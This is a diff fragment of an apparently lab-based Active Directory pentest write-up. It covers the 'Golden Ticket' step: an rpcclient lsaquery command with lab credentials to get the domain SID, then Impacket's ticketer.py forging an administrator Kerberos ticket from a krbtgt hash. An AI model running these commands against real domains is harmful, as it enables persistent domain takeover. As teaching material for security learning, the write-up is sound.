@@ -128,10 +128,12 @@ C:<span style="color:#ae81ff">\W</span>indows<span style="color:#ae81ff">\s</spa
 autorite nt<span style="color:#ae81ff">\s</span>ystème</code></pre></div>
 <h2 id="golden-ticket">GOLDEN TICKET !</h2>
 
-<p>NTHASH &gt; nthash from krbtgt
-DomainSID &gt;  echo lsaquery | sudo rpcclient  192.168.56.151 -U &ldquo;FOO\limited_user%Password123&rdquo;
-Domain &gt; domain FQDN
-&ldquo;Administrateur&rdquo; &gt; User for which the ticket is generated</p>
+<ul>
+<li>-nthash &gt; nthash from krbtgt</li>
+<li>-domain-sid &gt;  echo lsaquery | rpcclient  192.168.56.151 -U &ldquo;FOO\limited_user%Password123&rdquo;</li>
+<li>-domain &gt; domain FQDN</li>
+<li>&ldquo;Administrateur&rdquo; &gt; User for which the ticket is generated</li>
+</ul>
 <div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ python ticketer.py -nthash c40b7d2951af2ec4fbb356e3e99cf7a3 -domain-sid S-1-5-21-4043646307-996402590-333264239 -domain FOO.LOCAL Administrateur
 Impacket v0.9.16-dev - Copyright <span style="color:#ae81ff">2002</span>-2017 Core Security Technologies
 
